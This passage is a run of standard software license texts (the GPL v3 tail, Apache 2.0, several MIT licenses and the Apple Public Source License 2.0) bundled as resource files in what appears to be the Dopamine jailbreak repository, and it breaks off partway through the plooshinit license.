in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<https://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<https://www.gnu.org/licenses/why-not-lgpl.html>.

```

`Application/Dopamine/Resources/LICENSE_dimentio.md`:

```md
                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

```

`Application/Dopamine/Resources/LICENSE_kfd.md`:

```md
MIT License

Copyright (c) 2023 Félix Poulin-Bélanger

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_libc.md`:

```md
APPLE PUBLIC SOURCE LICENSE
Version 2.0 - August 6, 2003

Please read this License carefully before downloading this software.
By downloading or using this software, you are agreeing to be bound by
the terms of this License. If you do not or cannot agree to the terms
of this License, please do not download or use the software.

1. General; Definitions. This License applies to any program or other
work which Apple Computer, Inc. ("Apple") makes publicly available and
which contains a notice placed by Apple identifying such program or
work as "Original Code" and stating that it is subject to the terms of
this Apple Public Source License version 2.0 ("License"). As used in
this License:

1.1 "Applicable Patent Rights" mean: (a) in the case where Apple is
the grantor of rights, (i) claims of patents that are now or hereafter
acquired, owned by or assigned to Apple and (ii) that cover subject
matter contained in the Original Code, but only to the extent
necessary to use, reproduce and/or distribute the Original Code
without infringement; and (b) in the case where You are the grantor of
rights, (i) claims of patents that are now or hereafter acquired,
owned by or assigned to You and (ii) that cover subject matter in Your
Modifications, taken alone or in combination with Original Code.

1.2 "Contributor" means any person or entity that creates or
contributes to the creation of Modifications.

1.3 "Covered Code" means the Original Code, Modifications, the
combination of Original Code and any Modifications, and/or any
respective portions thereof.

1.4 "Externally Deploy" means: (a) to sublicense, distribute or
otherwise make Covered Code available, directly or indirectly, to
anyone other than You; and/or (b) to use Covered Code, alone or as
part of a Larger Work, in any way to provide a service, including but
not limited to delivery of content, through electronic communication
with a client other than You.

1.5 "Larger Work" means a work which combines Covered Code or portions
thereof with code not governed by the terms of this License.

1.6 "Modifications" mean any addition to, deletion from, and/or change
to, the substance and/or structure of the Original Code, any previous
Modifications, the combination of Original Code and any previous
Modifications, and/or any respective portions thereof. When code is
released as a series of files, a Modification is: (a) any addition to
or deletion from the contents of a file containing Covered Code;
and/or (b) any new file or other representation of computer program
statements that contains any part of Covered Code.

1.7 "Original Code" means (a) the Source Code of a program or other
work as originally made available by Apple under this License,
including the Source Code of any updates or upgrades to such programs
or works made available by Apple under this License, and that has been
expressly identified by Apple as such in the header file(s) of such
work; and (b) the object code compiled from such Source Code and
originally made available by Apple under this License.

1.8 "Source Code" means the human readable form of a program or other
work that is suitable for making modifications to it, including all
modules it contains, plus any associated interface definition files,
scripts used to control compilation and installation of an executable
(object code).

1.9 "You" or "Your" means an individual or a legal entity exercising
rights under this License. For legal entities, "You" or "Your"
includes any entity which controls, is controlled by, or is under
common control with, You, where "control" means (a) the power, direct
or indirect, to cause the direction or management of such entity,
whether by contract or otherwise, or (b) ownership of fifty percent
(50%) or more of the outstanding shares or beneficial ownership of
such entity.

2. Permitted Uses; Conditions & Restrictions. Subject to the terms
and conditions of this License, Apple hereby grants You, effective on
the date You accept this License and download the Original Code, a
world-wide, royalty-free, non-exclusive license, to the extent of
Apple's Applicable Patent Rights and copyrights covering the Original
Code, to do the following:

2.1 Unmodified Code. You may use, reproduce, display, perform,
internally distribute within Your organization, and Externally Deploy
verbatim, unmodified copies of the Original Code, for commercial or
non-commercial purposes, provided that in each instance:

(a) You must retain and reproduce in all copies of Original Code the
copyright and other proprietary notices and disclaimers of Apple as
they appear in the Original Code, and keep intact all notices in the
Original Code that refer to this License; and

(b) You must include a copy of this License with every copy of Source
Code of Covered Code and documentation You distribute or Externally
Deploy, and You may not offer or impose any terms on such Source Code
that alter or restrict this License or the recipients' rights
hereunder, except as permitted under Section 6.

2.2 Modified Code. You may modify Covered Code and use, reproduce,
display, perform, internally distribute within Your organization, and
Externally Deploy Your Modifications and Covered Code, for commercial
or non-commercial purposes, provided that in each instance You also
meet all of these conditions:

(a) You must satisfy all the conditions of Section 2.1 with respect to
the Source Code of the Covered Code;

(b) You must duplicate, to the extent it does not already exist, the
notice in Exhibit A in each file of the Source Code of all Your
Modifications, and cause the modified files to carry prominent notices
stating that You changed the files and the date of any change; and

(c) If You Externally Deploy Your Modifications, You must make
Source Code of all Your Externally Deployed Modifications either
available to those to whom You have Externally Deployed Your
Modifications, or publicly available. Source Code of Your Externally
Deployed Modifications must be released under the terms set forth in
this License, including the license grants set forth in Section 3
below, for as long as you Externally Deploy the Covered Code or twelve
(12) months from the date of initial External Deployment, whichever is
longer. You should preferably distribute the Source Code of Your
Externally Deployed Modifications electronically (e.g. download from a
web site).

2.3 Distribution of Executable Versions. In addition, if You
Externally Deploy Covered Code (Original Code and/or Modifications) in
object code, executable form only, You must include a prominent
notice, in the code itself as well as in related documentation,
stating that Source Code of the Covered Code is available under the
terms of this License with information on how and where to obtain such
Source Code.

2.4 Third Party Rights. You expressly acknowledge and agree that
although Apple and each Contributor grants the licenses to their
respective portions of the Covered Code set forth herein, no
assurances are provided by Apple or any Contributor that the Covered
Code does not infringe the patent or other intellectual property
rights of any other entity. Apple and each Contributor disclaim any
liability to You for claims brought by any other entity based on
infringement of intellectual property rights or otherwise. As a
condition to exercising the rights and licenses granted hereunder, You
hereby assume sole responsibility to secure any other intellectual
property rights needed, if any. For example, if a third party patent
license is required to allow You to distribute the Covered Code, it is
Your responsibility to acquire that license before distributing the
Covered Code.

3. Your Grants. In consideration of, and as a condition to, the
licenses granted to You under this License, You hereby grant to any
person or entity receiving or distributing Covered Code under this
License a non-exclusive, royalty-free, perpetual, irrevocable license,
under Your Applicable Patent Rights and other intellectual property
rights (other than patent) owned or controlled by You, to use,
reproduce, display, perform, modify, sublicense, distribute and
Externally Deploy Your Modifications of the same scope and extent as
Apple's licenses under Sections 2.1 and 2.2 above.

4. Larger Works. You may create a Larger Work by combining Covered
Code with other code not governed by the terms of this License and
distribute the Larger Work as a single product. In each such instance,
You must make sure the requirements of this License are fulfilled for
the Covered Code or any portion thereof.

5. Limitations on Patent License. Except as expressly stated in
Section 2, no other patent rights, express or implied, are granted by
Apple herein. Modifications and/or Larger Works may require additional
patent licenses from Apple which Apple may grant in its sole
discretion.

6. Additional Terms. You may choose to offer, and to charge a fee for,
warranty, support, indemnity or liability obligations and/or other
rights consistent with the scope of the license granted herein
("Additional Terms") to one or more recipients of Covered Code.
However, You may do so only on Your own behalf and as Your sole
responsibility, and not on behalf of Apple or any Contributor. You
must obtain the recipient's agreement that any such Additional Terms
are offered by You alone, and You hereby agree to indemnify, defend
and hold Apple and every Contributor harmless for any liability
incurred by or claims asserted against Apple or such Contributor by
reason of any such Additional Terms.

7. Versions of the License. Apple may publish revised and/or new
versions of this License from time to time. Each version will be given
a distinguishing version number. Once Original Code has been published
under a particular version of this License, You may continue to use it
under the terms of that version. You may also choose to use such
Original Code under the terms of any subsequent version of this
License published by Apple. No one other than Apple has the right to
modify the terms applicable to Covered Code created under this
License.

8. NO WARRANTY OR SUPPORT. The Covered Code may contain in whole or in
part pre-release, untested, or not fully tested works. The Covered
Code may contain errors that could cause failures or loss of data, and
may be incomplete or contain inaccuracies. You expressly acknowledge
and agree that use of the Covered Code, or any portion thereof, is at
Your sole and entire risk. THE COVERED CODE IS PROVIDED "AS IS" AND
WITHOUT WARRANTY, UPGRADES OR SUPPORT OF ANY KIND AND APPLE AND
APPLE'S LICENSOR(S) (COLLECTIVELY REFERRED TO AS "APPLE" FOR THE
PURPOSES OF SECTIONS 8 AND 9) AND ALL CONTRIBUTORS EXPRESSLY DISCLAIM
ALL WARRANTIES AND/OR CONDITIONS, EXPRESS OR IMPLIED, INCLUDING, BUT
NOT LIMITED TO, THE IMPLIED WARRANTIES AND/OR CONDITIONS OF
MERCHANTABILITY, OF SATISFACTORY QUALITY, OF FITNESS FOR A PARTICULAR
PURPOSE, OF ACCURACY, OF QUIET ENJOYMENT, AND NONINFRINGEMENT OF THIRD
PARTY RIGHTS. APPLE AND EACH CONTRIBUTOR DOES NOT WARRANT AGAINST
INTERFERENCE WITH YOUR ENJOYMENT OF THE COVERED CODE, THAT THE
FUNCTIONS CONTAINED IN THE COVERED CODE WILL MEET YOUR REQUIREMENTS,
THAT THE OPERATION OF THE COVERED CODE WILL BE UNINTERRUPTED OR
ERROR-FREE, OR THAT DEFECTS IN THE COVERED CODE WILL BE CORRECTED. NO
ORAL OR WRITTEN INFORMATION OR ADVICE GIVEN BY APPLE, AN APPLE
AUTHORIZED REPRESENTATIVE OR ANY CONTRIBUTOR SHALL CREATE A WARRANTY.
You acknowledge that the Covered Code is not intended for use in the
operation of nuclear facilities, aircraft navigation, communication
systems, or air traffic control machines in which case the failure of
the Covered Code could lead to death, personal injury, or severe
physical or environmental damage.

9. LIMITATION OF LIABILITY. TO THE EXTENT NOT PROHIBITED BY LAW, IN NO
EVENT SHALL APPLE OR ANY CONTRIBUTOR BE LIABLE FOR ANY INCIDENTAL,
SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES ARISING OUT OF OR RELATING
TO THIS LICENSE OR YOUR USE OR INABILITY TO USE THE COVERED CODE, OR
ANY PORTION THEREOF, WHETHER UNDER A THEORY OF CONTRACT, WARRANTY,
TORT (INCLUDING NEGLIGENCE), PRODUCTS LIABILITY OR OTHERWISE, EVEN IF
APPLE OR SUCH CONTRIBUTOR HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH
DAMAGES AND NOTWITHSTANDING THE FAILURE OF ESSENTIAL PURPOSE OF ANY
REMEDY. SOME JURISDICTIONS DO NOT ALLOW THE LIMITATION OF LIABILITY OF
INCIDENTAL OR CONSEQUENTIAL DAMAGES, SO THIS LIMITATION MAY NOT APPLY
TO YOU. In no event shall Apple's total liability to You for all
damages (other than as may be required by applicable law) under this
License exceed the amount of fifty dollars ($50.00).

10. Trademarks. This License does not grant any rights to use the
trademarks or trade names "Apple", "Apple Computer", "Mac", "Mac OS",
"QuickTime", "QuickTime Streaming Server" or any other trademarks,
service marks, logos or trade names belonging to Apple (collectively
"Apple Marks") or to any trademark, service mark, logo or trade name
belonging to any Contributor. You agree not to use any Apple Marks in
or as part of the name of products derived from the Original Code or
to endorse or promote products derived from the Original Code other
than as expressly permitted by and in strict compliance at all times
with Apple's third party trademark usage guidelines which are posted
at http://www.apple.com/legal/guidelinesfor3rdparties.html.

11. Ownership. Subject to the licenses granted under this License,
each Contributor retains all rights, title and interest in and to any
Modifications made by such Contributor. Apple retains all rights,
title and interest in and to the Original Code and any Modifications
made by or on behalf of Apple ("Apple Modifications"), and such Apple
Modifications will not be automatically subject to this License. Apple
may, at its sole discretion, choose to license such Apple
Modifications under this License, or on different terms from those
contained in this License or may choose not to license them at all.

12. Termination.

12.1 Termination. This License and the rights granted hereunder will
terminate:

(a) automatically without notice from Apple if You fail to comply with
any term(s) of this License and fail to cure such breach within 30
days of becoming aware of such breach;

(b) immediately in the event of the circumstances described in Section
13.5(b); or

(c) automatically without notice from Apple if You, at any time during
the term of this License, commence an action for patent infringement
against Apple; provided that Apple did not first commence
an action for patent infringement against You in that instance.

12.2 Effect of Termination. Upon termination, You agree to immediately
stop any further use, reproduction, modification, sublicensing and
distribution of the Covered Code. All sublicenses to the Covered Code
which have been properly granted prior to termination shall survive
any termination of this License. Provisions which, by their nature,
should remain in effect beyond the termination of this License shall
survive, including but not limited to Sections 3, 5, 8, 9, 10, 11,
12.2 and 13. No party will be liable to any other for compensation,
indemnity or damages of any sort solely as a result of terminating
this License in accordance with its terms, and termination of this
License will be without prejudice to any other right or remedy of
any party.

13. Miscellaneous.

13.1 Government End Users. The Covered Code is a "commercial item" as
defined in FAR 2.101. Government software and technical data rights in
the Covered Code include only those rights customarily provided to the
public as defined in this License. This customary commercial license
in technical data and software is provided in accordance with FAR
12.211 (Technical Data) and 12.212 (Computer Software) and, for
Department of Defense purchases, DFAR 252.227-7015 (Technical Data --
Commercial Items) and 227.7202-3 (Rights in Commercial Computer
Software or Computer Software Documentation). Accordingly, all U.S.
Government End Users acquire Covered Code with only those rights set
forth herein.

13.2 Relationship of Parties. This License will not be construed as
creating an agency, partnership, joint venture or any other form of
legal association between or among You, Apple or any Contributor, and
You will not represent to the contrary, whether expressly, by
implication, appearance or otherwise.

13.3 Independent Development. Nothing in this License will impair
Apple's right to acquire, license, develop, have others develop for
it, market and/or distribute technology or products that perform the
same or similar functions as, or otherwise compete with,
Modifications, Larger Works, technology or products that You may
develop, produce, market or distribute.

13.4 Waiver; Construction. Failure by Apple or any Contributor to
enforce any provision of this License will not be deemed a waiver of
future enforcement of that or any other provision. Any law or
regulation which provides that the language of a contract shall be
construed against the drafter will not apply to this License.

13.5 Severability. (a) If for any reason a court of competent
jurisdiction finds any provision of this License, or portion thereof,
to be unenforceable, that provision of the License will be enforced to
the maximum extent permissible so as to effect the economic benefits
and intent of the parties, and the remainder of this License will
continue in full force and effect. (b) Notwithstanding the foregoing,
if applicable law prohibits or restricts You from fully and/or
specifically complying with Sections 2 and/or 3 or prevents the
enforceability of either of those Sections, this License will
immediately terminate and You must immediately discontinue any use of
the Covered Code and destroy all copies of it that are in your
possession or control.

13.6 Dispute Resolution. Any litigation or other dispute resolution
between You and Apple relating to this License shall take place in the
Northern District of California, and You and Apple hereby consent to
the personal jurisdiction of, and venue in, the state and federal
courts within that District with respect to this License. The
application of the United Nations Convention on Contracts for the
International Sale of Goods is expressly excluded.

13.7 Entire Agreement; Governing Law. This License constitutes the
entire agreement between the parties with respect to the subject
matter hereof. This License shall be governed by the laws of the
United States and the State of California, except that body of
California law concerning conflicts of law.

Where You are located in the province of Quebec, Canada, the following
clause applies: The parties hereby confirm that they have requested
that this License and all related documents be drafted in English. Les
parties ont exige que le present contrat et tous les documents
connexes soient rediges en anglais.

EXHIBIT A.

"Portions Copyright (c) 1999-2003 Apple Computer, Inc. All Rights
Reserved.

This file contains Original Code and/or Modifications of Original Code
as defined in and that are subject to the Apple Public Source License
Version 2.0 (the 'License'). You may not use this file except in
compliance with the License. Please obtain a copy of the License at
http://www.opensource.apple.com/apsl/ and read it before using this
file.

The Original Code and all software distributed under the License are
distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
Please see the License for the specific language governing rights and
limitations under the License."

```

`Application/Dopamine/Resources/LICENSE_libgrabkernel2.md`:

```md
Copyright 2024 Alfie CG

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```

`Application/Dopamine/Resources/LICENSE_opainject.md`:

```md
MIT License

Copyright (c) 2022 Lars Fröder

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Application/Dopamine/Resources/LICENSE_plooshinit.md`:

```md
plooshinit is licnesed under:

MIT License

Copyright 2023 Nick Chan

Permission is hereby granted, free of charge, to any person obtaining a 
copy of this software and associated documentation files (the 
"Software"), to deal in the Software without restriction, including 
without limitation the rights to use, copy, modify, merge, publish, 
distribute, sublicense, and/or sell copies of the Software, and to 
permit persons to whom the Software is furnished to do so, subject to 
the following conditions:

The above copyright notice and this permission notice shall be included 
in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS 
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 
